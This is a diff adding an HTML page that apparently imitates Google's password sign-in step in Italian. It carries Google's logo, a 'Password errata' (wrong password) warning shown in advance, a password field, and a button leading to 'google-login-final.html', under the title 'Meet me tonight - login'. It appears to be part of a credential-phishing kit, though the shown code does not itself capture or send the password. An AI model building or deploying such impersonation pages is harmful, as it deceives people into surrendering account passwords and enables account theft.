@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/@mdi/font@3.x/css/materialdesignicons.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Material+Icons" rel="stylesheet">
+
+  <link rel="stylesheet" href="./css/style_pwdincorrectinput.css">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, minimal-ui">
+
+  <title>Meet me tonight - login</title>
+
+  <style>
+
+
+    #profileIdentifier{
+      font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
+    }
+  </style>
+</head>
+<body>
+  <div class="" id="logo">
+    <img style="width: 20%; padding: 0px;" class="center" src="./img/google-logo.png">
+  </div>
+
+  <div class="" style="text-align: center; padding-top: 0px; margin-top: -30px;">
+    <h1>
+      <span id="accedititolo"
+        style="font-size: 24px;
+        font-weight: 400;
+        line-height: 31.9992px;
+        font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
+        color: #202124;">
+        Ciao
+      </span>
+    </h1>
+  </div>
+
+  <!-- PASSWORD TEXTBOX -->
+  <div id="passwordinputsection"class="group log center">
+    <input id="email" type="password" pattern=".+@gmail.com|[0-9]{10}">
+    <span class="highlight"></span>
+
+    <label id="email-lbl">Inserisci la password</label>
+  </div>
+
+  <div  id="pwderrata">
+    <span>
+      Password errata. Riprova o fai clic su Password dimenticata per reimpostarla.
+    </span>
+  </div>
+
+  <br>
+
+  <table class="show" style="margin-left: 12px; margin-right: 20px; width: 95%;">
+    <tr>
+      <td class="show" style="width: 75%">
+        <button id="nonricordipasswordbutton" type="button">Password dimenticata?</button>
+      </td>
+      <td class="show" style="text-align: right; width: 25%">
+        <button class="button" id="submitbutton" type="button" name="button"><a style="color: #fff" href="google-login-final.html">Avanti</a></button>
+      </td>
+    </tr>
+  </table>
+
+  <script src="https://cdn.jsdelivr.net/npm/vue@2.x/dist/vue.js"></script>
+
+</body>
+</html>
